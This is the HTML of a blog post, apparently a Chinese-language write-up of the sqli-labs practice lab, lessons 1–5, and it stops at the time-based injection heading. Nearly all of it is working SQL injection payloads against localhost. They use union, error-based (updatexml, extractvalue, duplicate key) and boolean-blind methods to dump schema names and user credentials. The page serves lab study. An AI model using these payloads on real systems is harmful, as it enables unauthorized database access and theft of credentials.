@@ -1,0 +1,1390 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt; Sqli-labs: Basic Challenges Basic lesson 1 确认存在注入 http://localhost/sqli/Less-1/?id=1&#39; http://localhost/sqli/Less-1/?id=1&amp;rsquo;&amp;ndash;&#43; 确认query语句请求列数 http://localhost/sqli/Less-1/?id=1&amp;rsquo; order by 3&amp;ndash;&#43; 爆数据库 数据库 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata&amp;ndash;&#43; 表 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=&amp;ldquo;security&amp;rdquo;&amp;ndash;&#43; 列 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=&amp;ldquo;users&amp;rdquo;&amp;ndash;&#43; 得到数据 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select'><title>Sqli-labs Study: Basic Challenges</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/sqli_labs_study/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='Sqli-labs Study: Basic Challenges'>
+<meta property='og:description' content='&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt; Sqli-labs: Basic Challenges Basic lesson 1 确认存在注入 http://localhost/sqli/Less-1/?id=1&#39; http://localhost/sqli/Less-1/?id=1&amp;rsquo;&amp;ndash;&#43; 确认query语句请求列数 http://localhost/sqli/Less-1/?id=1&amp;rsquo; order by 3&amp;ndash;&#43; 爆数据库 数据库 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata&amp;ndash;&#43; 表 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=&amp;ldquo;security&amp;rdquo;&amp;ndash;&#43; 列 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=&amp;ldquo;users&amp;rdquo;&amp;ndash;&#43; 得到数据 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/sqli_labs_study/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='sqli_injection' /><meta property='article:tag' content='writeup' /><meta property='article:published_time' content='2022-03-21T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-22T15:58:22&#43;01:00'/>
+<meta name="twitter:title" content="Sqli-labs Study: Basic Challenges">
+<meta name="twitter:description" content="&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt; Sqli-labs: Basic Challenges Basic lesson 1 确认存在注入 http://localhost/sqli/Less-1/?id=1&#39; http://localhost/sqli/Less-1/?id=1&amp;rsquo;&amp;ndash;&#43; 确认query语句请求列数 http://localhost/sqli/Less-1/?id=1&amp;rsquo; order by 3&amp;ndash;&#43; 爆数据库 数据库 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata&amp;ndash;&#43; 表 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=&amp;ldquo;security&amp;rdquo;&amp;ndash;&#43; 列 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=&amp;ldquo;users&amp;rdquo;&amp;ndash;&#43; 得到数据 http://localhost/sqli/Less-1/?id=-1&amp;rsquo; union select">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writeup/" >
+                writeup
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/sqli_labs_study/">Sqli-labs Study: Basic Challenges</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 21, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>&lt;!&ndash;more&ndash;&gt;</p>
+<h2 id="sqli-labs-basic-challenges">Sqli-labs: Basic Challenges</h2>
+<h3 id="basic">Basic</h3>
+<h4 id="lesson-1">lesson 1</h4>
+<p>确认存在注入
+<a class="link" href="http://localhost/sqli/Less-1/?id=1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=1</a>'
+<a class="link" href="http://localhost/sqli/Less-1/?id=1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=1</a>&rsquo;&ndash;+</p>
+<p>确认query语句请求列数
+<a class="link" href="http://localhost/sqli/Less-1/?id=1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=1</a>&rsquo; order by 3&ndash;+</p>
+<p>爆数据库
+数据库
+<a class="link" href="http://localhost/sqli/Less-1/?id=-1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=-1</a>&rsquo; union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata&ndash;+
+表
+<a class="link" href="http://localhost/sqli/Less-1/?id=-1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=-1</a>&rsquo; union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=&ldquo;security&rdquo;&ndash;+</p>
+<p>列
+<a class="link" href="http://localhost/sqli/Less-1/?id=-1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=-1</a>&rsquo; union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=&ldquo;users&rdquo;&ndash;+</p>
+<p>得到数据
+<a class="link" href="http://localhost/sqli/Less-1/?id=-1"  target="_blank" rel="noopener"
+    >http://localhost/sqli/Less-1/?id=-1</a>&rsquo; union select 1,username,password from users where id=2&ndash;+</p>
+<h4 id="lesson-2">lesson 2</h4>
+<p>&lsquo;无法闭合，说明要求是一个INT型变量
+因此将所有单引号去掉之后，一切照旧</p>
+<h4 id="lesson-3">lesson 3</h4>
+<p>?id=&lsquo;得到报错：
+MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at line 1
+说明存在一个)需要闭合
+将注入点都改为
+?id=-1&rsquo;)即可</p>
+<h4 id="lesson-4">lesson 4</h4>
+<p>?id=-1&quot;)</p>
+<h4 id="lesson-5">lesson 5</h4>
+<p>盲注</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>报错注入</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>updatexml()</p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e),3)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#34;security&#34;),0x7e,version(),0x7e),3)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;user&#34;),0x7e,version(),0x7e),3)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e),3)-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>extractvalue()</p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))-- -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e))-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#34;security&#34;),0x7e,version(),0x7e))-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;user&#34;),0x7e,version(),0x7e))-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;:&#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e))-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>主键重复</p>
+<p>?id=1&rsquo; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a&ndash;+
+爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - #Subquery returns more than 1 row
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#34;security&#34;),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#34;user&#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select concat_ws(&#39;:&#39;, username, password) from users limit 0, 1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>布尔盲注</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>left()</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and left(database(), 1)&lt;&#39;s&#39;-- -
+</span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and left((select schema_name from information_schema.schemata limit 0,1), 1)&lt;&#39;s&#39;-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and left((select table_name from information_schema.tables where  table_schema = &#34;security&#34; limit 0,1), 1)&lt;&#39;a&#39;-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and left((select column_name from information_schema.columns where  table_name = &#34;users&#34; limit 0,1), 1)&lt;&#39;a&#39;-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and left((select username from users limit 0,1), 1)&lt;&#39;z&#39;-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>substr()</code> &amp; <code>ascii()</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) &lt; 80-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0, 1),1,1)) &lt; 80-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0, 1),1,1)) &gt; 80-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select username from users limit 0, 1),1,1)) &lt; 50-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>regexp</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.schemata where schema_name regexp &#39;^security&#39; limit 0,1)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.tables where table_schema = &#34;security&#34; and table_name regexp &#39;^users&#39; limit 1,1)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from users where username regexp &#39;^dumb&#39; limit 1,1)-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>like</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and ((select schema_name from information_schema.schemata limit 0,1) like &#39;i%&#39;)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and ((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1) like &#39;x%&#39;)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and ((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1) like &#39;id%&#39;)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and ((select username from users limit 0,1) like &#39;dumb%&#39;)-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>ORD()</code> and <code>MID()</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select schema_name from information_schema.schemata limit 0,1),1,1))&lt;68-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1),1,1))&gt;68-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1),1,1))&lt;68-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))&gt;68-- -
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>延时注入</p>
